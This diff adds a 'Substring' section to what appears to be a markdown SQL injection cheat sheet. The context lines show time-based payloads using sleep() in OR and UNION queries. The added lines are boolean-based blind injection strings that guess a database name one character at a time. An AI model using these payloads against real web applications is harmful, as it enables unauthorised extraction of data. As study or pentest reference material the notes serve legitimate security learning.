@@ -88,3 +88,10 @@ mysql> select * from users where user_id = 1 or (select sleep(1)+1);
 ```sql
 select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
 ```
+
+## Substring
+```sql
+' OR SUBSTRING(database(),1,1) = 'a
+' OR SUBSTRING(database(),1,1) = 'b
+' OR SUBSTRING(database(),1,1) = 'c
+```
